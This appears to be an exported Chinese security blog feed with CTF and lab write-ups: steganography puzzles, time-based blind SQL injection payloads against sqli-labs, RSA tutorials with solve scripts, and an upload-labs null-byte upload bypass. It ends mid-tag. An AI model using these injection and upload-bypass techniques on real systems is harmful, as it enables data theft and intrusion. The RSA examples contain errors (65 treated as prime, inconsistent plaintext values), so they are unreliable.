href="#4、snake" class="headerlink" title="4、snake"></a>4、snake</h5><p>附件是一张蛇的图片，图就不放了 有点吓人。</p><p>binwalk分析出有压缩文件<br><img src="https://img-blog.csdnimg.cn/20210214233331322.png" alt="在这里插入图片描述">分离出一个压缩包，里面有 key和cipher 文件，key文件中是base64加密的密文：</p><pre><code class="bash">V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</code></pre><p>解密得到：What is Nicki Minaj’s favorite song that refers to snakes? （尼基·米纳吉最喜欢的关于蛇的歌是什么？）</p><p>百度了一下，这首歌应该是 Anaconda ，即 key应该就是 Anaconda<br><img src="https://img-blog.csdnimg.cn/20210214234126976.png" alt="在这里插入图片描述"><br>但是 cipher 不知道是什么文件。百度了一下才知道，对于蛇这个名词，在英语中还有一个翻译：Serpent。</p><p>Serpent是一个加密算法，于是对 cipher文件进行 Serpent解密</p><p>在线网站：<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p><p>key是 anaconda<br><img src="https://img-blog.csdnimg.cn/20210215000531120.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag<br><img src="https://img-blog.csdnimg.cn/20210215001043502.png" alt="在这里插入图片描述"></p><h5 id="5、-BJDCTF-2nd-圣火昭昭"><a href="#5、-BJDCTF-2nd-圣火昭昭" class="headerlink" title="5、[BJDCTF 2nd]圣火昭昭"></a>5、[BJDCTF 2nd]圣火昭昭</h5><p>打开附件，是一张喵图<br><img src="https://img-blog.csdnimg.cn/20210215001222799.jpg" alt="在这里插入图片描述"><br>在图片属性备注里可以看到<br><img src="https://img-blog.csdnimg.cn/20210215150707913.png" alt="在这里插入图片描述"><br>新佛曰 在线解密 <a href="http://hi.pcmoe.net/buddha.html">http://hi.pcmoe.net/buddha.html</a><br><img src="https://img-blog.csdnimg.cn/20210215150845879.png" alt="在这里插入图片描述"><br>题目说了com是多余的，所以解出来应该是 gemlove</p><p>根据题目提示，有一个加重的猜字，很容易联想到 outguess加密 （其实是百度的）<a href="https://blog.csdn.net/xuqi7/article/details/63362839">工具介绍</a></p><p><strong>隐写工具outguess使用</strong>：</p><p>kail下载</p><pre><code class="bash">git clone https://github.com/crorvick/outguess</code></pre><p>cd outguess</p><p>安装</p><pre><code class="bash">./configure &amp;&amp; make &amp;&amp; make install</code></pre><p> 解密</p><pre><code class="bash"> outguess -k &quot;key&quot; -r 1.jpg hidden.txt</code></pre><p>解密内容会放在hidden.txt中</p><p><img src="https://img-blog.csdnimg.cn/20210215161119589.png" alt="在这里插入图片描述"><br>打开out.txt 得到flag<br><img src="https://img-blog.csdnimg.cn/20210215161249187.png" alt="在这里插入图片描述"></p><hr>🆗，先总结这么多吧。]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>时间盲注详解 Sqli-labs闯关(Less 9—10)</title>
      <link href="2019/09/01/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%20Sqli-labs%E9%97%AF%E5%85%B3(Less%209%E2%80%9410)/"/>
      <url>2019/09/01/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%E8%AF%A6%E8%A7%A3%20Sqli-labs%E9%97%AF%E5%85%B3(Less%209%E2%80%9410)/</url>
      
        <content type="html"><![CDATA[<p>今天来总结下时间盲注的知识。<hr></p><p>时间盲注和bool盲注是很像的，区别就是“参照物”不同，基于bool的盲注可以通过页面的一些变化来进行判断结果，但是有时候，执行一些sql语句的测试，页面不会有像布尔盲注的时候直观的变化，这个时候可以在基于布尔的盲注上结合<code>if</code>判断和<code>sleep()</code>函数来得到一个时间上的变换延迟的参照，也就可以让我们进行一些判断。也就是所谓的基于时间的盲注。</p><p>直接看题吧<br><strong>Less-9</strong> 基于时间的单引号盲注<br><img src="http://img-blog.csdnimg.cn/2019072723363099.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>使用<code>if(查询语句,1,sleep(5))</code>，即如果我们的查询语句为真，那么直接返回结果；如果我们的查询语句为假，那么过5秒之后返回页面。所以我们就根据返回页面的时间长短来判断我们的查询语句是否执行正确。</p><ol><li> <code>if(expr1,expr2,expr3)</code>:判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</li><li><code>sleep(n)</code>：将程序挂起一段时间 n单位为秒<br>根据题目提示，已经知道了为单引号注入。</li></ol><ul><li>猜测数据库：<br><code>http://127.0.0.1/sqli-labs-master/Less-9/?id=1%27and%20If(ascii(substr(database(),1,1))=115,1,sleep(5))--+</code><br>说明第一位是 s （ascii 码是 115）<br><code>http://127.0.0.1/sqllib/Less-9/?id=1%27and%20If(ascii(substr(database(),2,1))=101,1,sleep(5))--+</code> 说明第二位是 e （ascii 码是 101） …. 以此类推，我们知道了数据库名字是 security</li><li>猜测 security 的数据表：<br><code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))=101,1,sleep(5))--+</code> </li><li>猜测第一个数据表的第一位是 e,…依次类推，得到 emails<br><code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select table_name from information_s chema.tables where table_schema=&#39;security&#39; limit 1,1),1,1))=114,1,sleep(5))--+</code> </li><li>猜测第二个数据表的第一位是 r,…依次类推，得到 referers … 再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users 猜测 users 表的列：<br><code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select column_name from information _schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105,1,sleep(5))--+</code> </li><li>猜测 users 表的第一个列的第一个字符是 i， 以此类推，我们得到列名是 id，username，password</li><li>猜测 username 的值： <code>http://127.0.0.1/sqllib/Less-9/?id=1&#39;and If(ascii(substr((select username from users limit 0,1), 1,1))=68,1,sleep(5))--+</code> </li><li>猜测 username 的第一行的第一位 以此类推，我们得到数据库 username，password 的所有内容。<br>less10 只是把单引号换成了双引号，其他同理。 </li></ul><p>以上的过程就是我们利用 sleep()函数注入的整个过程。<br>手动注入过程很是繁琐，可以用二分法提高效率，但大部分情况下都会选择我们写脚本注入。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞原理 </category>
          
          <category> Sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RSA加密解密原理</title>
      <link href="2019/08/17/RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%8E%9F%E7%90%86/"/>
      <url>2019/08/17/RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<p><strong>引言</strong>：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;CTF密码学类题目中，RSA加密可谓是很重要且常见的加密类型，今天就总结下 RSA加密的原理及解密方法。<hr></p><h3 id="RSA算法简介"><a href="#RSA算法简介" class="headerlink" title="RSA算法简介:"></a>RSA算法简介:</h3><ul><li><p>RSA加密算法是一种 <strong>非对称加密</strong> 算法，RSA算法相比别的算法思路非常清晰，但是想要破解的难度非常大。</p><ul><li>RSA算法基于一个非常简单的数论事实：两个素数相乘得到一个大数很容易，但是由一个大数分解为两个素数相乘却非常难。</li></ul></li></ul><h4 id="1、什么是非对称加密算法："><a href="#1、什么是非对称加密算法：" class="headerlink" title="1、什么是非对称加密算法："></a>1、什么是非对称加密算法：</h4><ul><li>和 <strong>对称加密</strong> 算法使用同一个密钥进行加密解密的方式不同，<strong>非对称加密</strong> 算法是使用不同密钥进行加密和解密的算法，也称为公私钥加密。</li></ul><p>非对称加密算法实现机密信息交换的基本过程：</p><ul><li>甲方生成 <strong>一对密钥</strong> 并将其中的一把作为 <strong>公钥</strong> 向其它方公开，得到该公钥的乙方使用该密钥对机密信息进行加密后再发送给甲方，甲方再用自己保存的另一把 <strong>私钥</strong> 对加密后的信息进行解密。</li></ul><p>图解：<br><img src="https://img-blog.csdnimg.cn/20201206164925486.png"></p><h4 id="2、RSA-加密原理："><a href="#2、RSA-加密原理：" class="headerlink" title="2、RSA 加密原理："></a>2、RSA 加密原理：</h4><p>了解了非对称加密算法的原理，我们再来说说 RSA 加密算法的基本流程。</p><p>如图：<img src="https://img-blog.csdnimg.cn/20201206172042851.png"></p><h4 id="3、RSA加密算法过程详解："><a href="#3、RSA加密算法过程详解：" class="headerlink" title="3、RSA加密算法过程详解："></a>3、RSA加密算法过程详解：</h4><p>先来了解一下什么是 互质数：</p><ul><li>两个或多个整数的公因数只有1的非0自然数，则两个非0自然数叫做互质数。例如 2 和 3，公因数只有1，所以为互质数。</li></ul><h5 id="1、找出质数-："><a href="#1、找出质数-：" class="headerlink" title="1、找出质数 ："></a>1、找出质数 ：</h5><p>随机找两个质数 p 和 q ，p 与 q 越大，越安全。</p><h5 id="2、计算公共模数："><a href="#2、计算公共模数：" class="headerlink" title="2、计算公共模数："></a>2、计算公共模数：</h5><pre><code class="java"> n = p * q </code></pre><p>假设 p = 65 ，q = 71。计算他们的乘积 n = p * q = 4615 ，转化为二进制为 1001000000111，即该加密算法即为 13 位。位数越长，算法则越难被破解。实际应用中，RSA密钥一般是1024位，重要场合则为2048位。</p><h5 id="3、计算欧拉函数-φ-n-："><a href="#3、计算欧拉函数-φ-n-：" class="headerlink" title="3、计算欧拉函数 φ(n)："></a>3、计算欧拉函数 φ(n)：</h5><pre><code class="java">φ(n) = φ(p*q) = (p-1)(q-1)</code></pre><p>φ(n) 表示：在小于等于 n 的正整数之中，与 n 构成互质关系的数的个数。</p><p>例：</p><p>在 1 到 8 之中，与 8 形成互质关系的是1、3、5、7，所以 φ(n) = 4。 </p><p><strong>计算公式（即欧拉函数）为</strong>：</p><p>前提：P 与 Q 均为质数</p><pre><code class="java">φ(n) = φ(P*Q)= (P-1)(Q-1) </code></pre><p>设：</p><p>P =  65 ，Q = 71  </p><pre><code class="java">φ(n) = 64 * 70 = 4480 </code></pre><p>即有4480 个数与 n（4615）互质。</p><h5 id="4、计算公钥-e："><a href="#4、计算公钥-e：" class="headerlink" title="4、计算公钥 e："></a>4、计算公钥 e：</h5><pre><code class="java">1 &lt; e &lt; φ(n)</code></pre><p>要求：</p><ul><li>e 的取值必须是整数</li><li>e 和 φ(n) 必须是互质数</li></ul><h5 id="5、计算私钥-d："><a href="#5、计算私钥-d：" class="headerlink" title="5、计算私钥 d："></a>5、计算私钥 d：</h5><p>计算公式：</p><pre><code class="java">e * d % m = 1  其中(φ(n) = m)</code></pre><p>即找一个整数 d，使得 <code>(e * d ) % m = 1</code>，等价于 <code>e * d - 1 = y * m ( y 为整数）</code>。</p><p>得到 d ，实质就是对下面二元一次方程求解：</p><p> <code>e * x - m * y = 1</code>  e，m为已知量，求 x，y。</p><p>这个方程可以用 <strong>扩展欧几里得算法</strong> 求解，此处就不详细介绍了，可以看这个了解下： <a href="https://blog.csdn.net/destiny1507/article/details/81750874">扩展欧几里得算法</a></p><p>得到：</p><ul><li><p>公钥＝(e，n)</p></li><li><p>私钥＝(d，n)</p></li></ul><p>对外，只暴露公钥。</p><h5 id="6、加密生成密文："><a href="#6、加密生成密文：" class="headerlink" title="6、加密生成密文："></a>6、加密生成密文：</h5><p>C ＝ $M^e$ mod n</p><blockquote><p>C：密文 M：明文</p></blockquote><h5 id="7、解密生成明文："><a href="#7、解密生成明文：" class="headerlink" title="7、解密生成明文："></a>7、解密生成明文：</h5><p>M ＝$C^d$ mod n</p><blockquote><p>C：密文 M：明文</p></blockquote><hr><p>下面举一个完整的例子</p><h4 id="4、示例："><a href="#4、示例：" class="headerlink" title="4、示例："></a>4、示例：</h4><p>1、找出质数 p 、q :</p><pre><code class="java">p = 3  q = 11</code></pre><p>2、计算公共模数 n：</p><pre><code class="java">n = p * q = 3 * 11 = 33n = 33</code></pre><p>3、计算欧拉函数 φ(n)：</p><pre><code class="java">φ(n) = (p-1)(q-1) = 2 * 10 = 20φ(n) = 20</code></pre><p>4、计算公钥 e：</p><pre><code class="java">1 &lt; e &lt; φ(n)1 &lt; e &lt; 20</code></pre><p>e 的取值范围为： { 3, 7, 9, 11, 13, 17, 19 }</p><p>为了方便测试，我们取最小的值 e =3，3 和 φ(n) = 20 互为质数，满足条件。</p><p>5、计算私钥 d：</p><pre><code class="java">e * d % φ(n) = 13 * d % 20 = 1   </code></pre><p>计算出 d = 7 </p><p>6、公钥加密：</p><blockquote><p>公式：C ＝ $M^e$ mod n</p></blockquote><p>随便拿一个数字，这里方便演示 取 M = 2</p><p>C = $3^3$ % 33 = 8</p><p> “ M = 3 “ 经过RSA加密后变成了 “ C = 8 “</p><p>7、私钥解密：</p><blockquote><p>M ＝$C^d$ mod n</p></blockquote><pre><code class="java">C = 8d = 7n = 33</code></pre><p>计算：</p><p>M = $8^7$ % 33</p><p>解得： M =  2 <hr></p><p>🆗，简单了解 RSA的基本原理之后，来看几个CTF中的RSA例题。</p><h4 id="5、例题："><a href="#5、例题：" class="headerlink" title="5、例题："></a>5、例题：</h4><h5 id="1、easy-RSA"><a href="#1、easy-RSA" class="headerlink" title="1、easy_RSA:"></a>1、easy_RSA:</h5><p><img src="https://img-blog.csdnimg.cn/20201207201511188.png"><br>打开附件：<br><img src="https://img-blog.csdnimg.cn/20201207201631363.png"><br>这题很简单，就是求参数d 的值，那么如何计算d 呢？也就是如何求 <code>e * x - m * y =1</code> 式子中的 x ？</p><p>步骤：</p><p>1、先计算欧拉函数：<br><img src="https://img-blog.csdnimg.cn/20201207205109633.png"><br>得到 φ(n) = 2135733082216268400</p><p>2、求 d：</p><p>根据加密原理，解密的方法就是：把欧拉函数的值 +1，再除以<code>17 * n</code>（这里 n 先取1）<br><img src="https://img-blog.csdnimg.cn/20201207210721780.png"><br>得到 d =   125631357777427553，尝试提交flag： cyberpeace{125631357777427553} 正确，看来 n 的值确实为 1 。(￣▽￣)”</p><p>提供一个求私钥脚本：</p><pre><code class="python">#!/usr/bin/env python3# -*- coding:utf-8 -*-import gmpy2p = 473398607161q = 4511491e = 17m = (p-1)*(q-1)d = int(gmpy2.invert(e,m)) //invert: 求逆元,返回值是一个 mpz 对象print(&#39;私钥为:&#39;,d)</code></pre><p>运行结果（我的python出了点小问题）：<br><img src="https://img-blog.csdnimg.cn/20201207233126519.png"><br>得到 d =  125631357777427553</p><h5 id="2、i春秋-RSA"><a href="#2、i春秋-RSA" class="headerlink" title="2、i春秋 RSA :"></a>2、i春秋 RSA :</h5><p><img src="https://img-blog.csdnimg.cn/20201208133706815.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>打开附件：<br><img src="https://img-blog.csdnimg.cn/20201207233245612.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>可以看到题目给出了 n,e,c 三个值 ，求明文的值。</p><p>首先先对 n 进行因式分解，使用在线网站：<a href="http://www.factordb.com/index.php">大数分解网站</a></p><p>得到 p ，q ：</p><p><img src="https://img-blog.csdnimg.cn/20201208134248231.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"></p><pre><code class="java">p = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473</code></pre><pre><code class="java">q = 31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221</code></pre><p>2、相关参数都已得到，就可以编写脚本求明文信息了：</p><pre><code class="python">#!/usr/bin/env python# coding:utf-8import gmpy2   p = gmpy2.mpz(31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928997877221)q = gmpy2.mpz(31093551302922880999883020803665536616272147022877428745314830867519351013248914244880101094365815998050115415308439610066700139164376274980650005150267949853671653233491784289493988946869396093730966325659249796545878080119206283512342980854475734097108975670778836003822789405498941374798016753689377992355122774401780930185598458240894362246194248623911382284169677595864501475308194644140602272961699230282993020507668939980205079239221924230430230318076991507619960330144745307022538024878444458717587446601559546292026245318907293584609320115374632235270795633933755350928537598242214216674496409625928797450473)e = gmpy2.mpz(65537)#计算私钥dm = (p - 1) * (q - 1)d = gmpy2.invert(e, m)print &quot;private key:&quot;,d#求密文Mc = gmpy2.mpz(168502910088858295634315070244377409556567637139736308082186369003227771936407321783557795624279162162305200436446903976385948677897665466290852769877562167487142385308027341639816401055081820497002018908896202860342391029082581621987305533097386652183849657065952062433988387640990383623264405525144003500286531262674315900537001845043225363148359766771033899680111076181672797077410584747509581932045540801777738548872747597899965366950827505529432483779821158152928899947837196391555666165486441878183288008753561108995715961920472927844877569855940505148843530998878113722830427807926679324241141182238903567682042410145345551889442158895157875798990903715105782682083886461661307063583447696168828687126956147955886493383805513557604179029050981678755054945607866353195793654108403939242723861651919152369923904002966873994811826391080318146260416978499377182540684409790357257490816203138499369634490897553227763563553981246891677613446390134477832143175248992161641698011195968792105201847976082322786623390242470226740685822218140263182024226228692159380557661591633072091945077334191987860262448385123599459647228562137369178069072804498049463136233856337817385977990145571042231795332995523988174895432819872832170029690848)print &quot;明文:&quot;M  =  pow(c,d,p*q)print &#39;10进制: &#39;+str(M)flag = str(hex(M))[2:]# 从第3位为往后截取print &#39;16进制: &#39;+flagprint &#39;ASCII码: &#39;+flag.decode(&#39;hex&#39;)</code></pre><p> 注释：  </p><ul><li>gmpy2.mpz(x)： 初始化一个大整数x  </li><li>pow( x, y, z): 计算 $x^y$ mod z </li></ul><p>得到 flag：<br><img src="https://img-blog.csdnimg.cn/20201208165148163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70"><br>🆗，关与RSA的总结暂时就到这里了，以后发现好用的方法或解题技巧会接着更新。╰(￣ω￣ｏ)</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学—RSA加密解密详解</title>
      <link href="2019/08/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E8%AF%A6%E8%A7%A3/"/>
      <url>2019/08/17/%E5%AF%86%E7%A0%81%E5%AD%A6%E2%80%94%E2%80%94RSA%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86%E8%AF%A6%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<p><strong>引言</strong>：<br>CTF密码学类题目中，RSA加密可谓是很重要且常见的加密类型，今天就总结下RSA加密的原理及解密方法。</p><a id="more"></a><h2 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法:"></a>RSA算法:</h2><ul><li>RSA加密算法是一种<code>非对称加密</code>算法，RSA算法相比别的算法思路非常清晰，但是想要破解的难度非常大。</li><li>RSA算法基于一个非常简单的数论事实：两个素数相乘得到一个大数很容易，但是由一个大数分解为两个素数相乘却非常难。<br><img src="http://img-blog.csdnimg.cn/20190815133727214.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul><h2 id="公钥和私钥的生成："><a href="#公钥和私钥的生成：" class="headerlink" title="公钥和私钥的生成："></a>公钥和私钥的生成：</h2><p><strong>第一步：随机找两个质数 P 和 Q ,P 与 Q 越大，越安全</strong></p><p> 比如 P = 67 ，Q = 71。计算他们的乘积 n = P * Q = 4757 ，转化为二进为1001010010101，该加密算法即为 13 位，实际算法是 1024 位 或 2048 位，位数越长，算法越难被破解。</p><p> <strong>第二步：计算 n 的欧拉函数 φ(n)</strong></p><p> φ(n) 表示在小于等于 n 的正整数之中，与 n 构成互质关系的数的个数。例如：在 1 到 8 之中，与 8 形成互质关系的是1、3、5、7，所以 φ(n) = 4。 如果 n = P * Q，P 与 Q 均为质数，则 φ(n) = φ(P * Q)= φ(P - 1)φ(Q - 1) = (P - 1)(Q - 1) 。 本例中 φ(n) = 66 * 70 = 4620，这里记为 m， m = φ(n) = 4620</p><p> <strong>第三步：随机选择一个整数 e，条件是1&lt; e &lt; m，且 e 与 m 互质</strong></p><p> 公约数只有 1 的两个整数，叫做互质整数，这里我们随机选择 e = 101 请注意不要选择 4619，如果选这个，则公钥和私钥将变得相同。</p><p> *<em>第四步：有一个整数 d，可以使得 e</em>d  除以 m 的余数为 1**</p><p>即找一个整数 d，使得  (e * d ) % m = 1。 等价于e * d - 1 = y * m ( y 为整数） 找到 d ，实质就是对下面二元一次方程求解。 e * x - m * y =1 ，其中 e = 101，m = 4620； 101x - 4620y =1 这个方程可以用<strong>扩展欧几里得算法</strong>求解，此处省略具体过程。<br> 总之算出一组整数解  <code>（x，y ）= （ 1601，35）</code>，即 d = 1601。 到此密钥对生成完毕。不同的 e 生成不同的 d，因此可以生成多个密钥对。 本例中公钥为 <code>（n，e) = (4757 , 101)</code>，私钥为 <code>（n，d) = (4757 ，1601)</code> ，仅 <code>（n，e) = (4757 , 101)  </code>是公开的，其余数字均不公开。可以想像如果只有 n 和 e，如何推导出 d，目前只能靠暴力破解，位数越长，暴力破解的时间越长。</p><h2 id="加密生成密文-："><a href="#加密生成密文-：" class="headerlink" title="加密生成密文 ："></a>加密生成密文 ：</h2><p>比如甲向乙发送汉字“中”，就要使用乙的公钥加密汉字 “中”， 以 utf-8 方式编码为 [e4 b8 ad]，转为 10 进制为 [228,184,173]。要想使用公钥<code>（n，e) = (4757 , 101)</code>加密，要求被加密的数字必须小于 n，被加密的数字必须是整数，字符串可以取 ascii 值或unicode值，因此将“中”字折为三个字节 [228,184,173]，分别对三个字节加密。</p><p>假设 a 为明文，b 为密文，则按下列公式计算出 b</p><pre><code>a^e % n = b </code></pre><p>计算 [228,184,173]的密文：</p><pre><code>228^101 % 4757 = 4296184^101 % 4757 = 2458173^101 % 4757 = 3263</code></pre><p>即 [228,184,173]加密后得到密文 [4296，2458，3263] ，如果没有私钥 d ,神仙也无法从 [4296，2458，3263]中恢复 [228,184,173]。</p><h2 id="解密生成明文："><a href="#解密生成明文：" class="headerlink" title="解密生成明文："></a>解密生成明文：</h2><p>乙收到密文 [4296，2458，3263]，并用自己的私钥<code>（n，d) = (4757 ，1601)</code> 解密。解密公式如下：<br>假设 a 为明文，b 为密文，则按下列公式计算出 a</p><pre><code>a^d % n = b </code></pre><p>密文 [4296，2458，3263] 的明文如下：</p><pre><code>4296^1601% 4757 = 2282458^1601% 4757 = 1843263^1601% 4757 = 173</code></pre><p>即密文 [4296，2458，3263] 解密后得到 [228,184,173]<br>将[228,184,173] 再按 utf-8 解码为汉字 “中”，至此解密完毕。</p><p>参考blog     <a href="https://www.jianshu.com/p/fbb8bf7baa97">https://www.jianshu.com/p/fbb8bf7baa97</a></p><p>现在知道了加密解密的基本原理，下面就做几个题展示下。<hr></p><p><strong>1.easy_RSA</strong></p><p><img src="http://img-blog.csdnimg.cn/20190815235347407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开附件：<br><img src="http://img-blog.csdnimg.cn/20190815235420989.png" alt="在这里插入图片描述"><br>这题很简单，就是求参数d的值<br>那么如何计算d呢？也就是如何求e * x - m * y =1 式子中的x的值，这个时候就需要了解以下扩展欧几里得算法了，<a href="http://blog.csdn.net/destiny1507/article/details/81750874">扩展欧几里得算法详解</a>看完应该了解了计算的原理<br>这里分享一个脚本（需要安装gmpy2）：</p><pre><code>#!/usr/bin/env python3# -*- coding:utf-8 -*-import gmpy2p = 473398607161q = 4511491e = 17s = (p-1)*(q-1)d = gmpy2.invert(e,s)print(&#39;flag is :&#39;,d)</code></pre><p>得到<code>d=125631357777427553</code> flag为<code>cyberpeace&#123;125631357777427553&#125;</code><br>好，关于RSA的加密解密原理，就先总结到这吧，以后发现好用的方法或解题技巧会接着更新。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Crypto </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>上传漏洞 upload-labs 练习（二）</title>
      <link href="2019/08/14/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2019/08/14/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%20upload-labs%20%E7%BB%83%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>接着上篇的总结   （=￣ω￣=）<br>Less-11—20</p><p>上篇链接：<a href="https://blog.csdn.net/qq_43531669/article/details/98470372">点这</a>  <hr></p><p><strong>Less-11</strong><br>这关采用的防御手法是白名单过滤，只允许上传jpg、png和gif类型，并且将上传的文件给重命名为了白名单中的后缀<br>查看源码：</p><pre><code>    $is_upload = false;    $msg = null;    if(isset($_POST[&#39;submit&#39;]))&#123;      $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;);      $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1);      if(in_array($file_ext,$ext_arr))&#123;      $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;];      $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;       if(move_uploaded_file($temp_file,$img_path))&#123;                $is_upload = true;            &#125; else &#123;                $msg = &#39;上传出错！&#39;;            &#125;        &#125; else&#123;            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;        &#125;    &#125;</code></pre><p>处理上传文件的方式</p><pre><code>$img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code></pre><p>看起来这样防御并没有什么问题，但是这一关上传目录是可控的，所以可以先上传一个后缀名为<code>.jpg</code>，然后修改上传目录为<code>.php</code>后缀，之后在<code>.php</code>后使用截断后面的拼接内容，注意这里需要关掉<code>magic_quotes_gpc</code>这个php扩展，否则00会被转义<br><code>$_GET[&#39;save_path&#39;]</code>这里使用00截断<code>.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</code><br>注意这里的00字符因为在url的GET参数中，所以需用进行url编码</p><ul><li><p><strong>截断的条件</strong>：<br>1）php版本必须小于5.3.4<br>2）打开php的配置文件php-ini，将magic_quotes_gpc设置为Off</p></li><li><p><strong>关闭magic_quotes_gpc函数</strong>:<br>在php.ini文件内找到<br><code> magic_quotes_gpc = On</code><br>将其改为<br>  <code>magic_quotes_gpc = Off</code></p></li></ul><p><img src="http://img-blog.csdnimg.cn/20190809224249503.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/2019080922323739.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" 